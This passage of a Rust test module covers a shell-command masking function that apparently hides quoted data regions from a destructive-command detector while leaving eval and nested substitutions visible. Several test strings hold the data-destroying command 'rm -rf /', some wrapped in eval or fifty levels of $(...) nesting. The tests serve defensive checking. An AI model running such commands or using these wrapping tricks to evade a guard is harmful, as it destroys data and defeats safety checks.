    fn eval_command_line_is_unchanged_end_to_end() {
        // `eval` is not on the data-consuming table, so its argument is
        // never scanned as a data region at all — it stays fully visible,
        // byte-for-byte, regardless of what's nested inside it.
        let cmd = "eval \"$(echo 'rm -rf /')\"";
        assert_eq!(mask_data_regions(cmd), cmd);
    }

    #[test]
    fn deeply_nested_substitution_has_no_depth_cap() {
        // With the recursive close-parsing scanner removed, there is no
        // nesting to recurse into and therefore nothing to cap — arbitrarily
        // deep `$(...)` nesting around a disqualified echo argument still
        // resolves in a single linear pass, no stack risk, still visible.
        let mut inner = String::from("rm -rf /");
        for _ in 0..50 {
            inner = format!("$({inner})");
        }
        let full = format!("echo \"{inner}\"");
        visible(&full, "rm -rf /");
    }

    #[test]
    fn oversize_input_is_unchanged() {
        let cmd = "echo ".to_string() + &"a".repeat(70_000);
        assert_eq!(mask_data_regions(&cmd), cmd);
    }

    // ---- masking replaces with spaces, never deletes ---------------------

    #[test]
    fn masked_span_becomes_spaces_not_deletion() {
        let masked = mask_data_regions("echo \"rm -rf /\"");
        // Same char count in, same char count out.
        assert_eq!(masked.chars().count(), "echo \"rm -rf /\"".chars().count());
    }

    #[test]
    fn adjacent_executed_fragments_do_not_splice_across_a_masked_span() {
        // If masking ever *deleted* instead of blanking, "fooX" + "Ybar"
        // could splice into something a pattern matches that neither half
        // alone would. Confirm the masked span still separates them.
        let masked = mask_data_regions("echo \"XXXX\"YYYY");
        assert!(!masked.contains("XXXXYYYY"));
    }
}
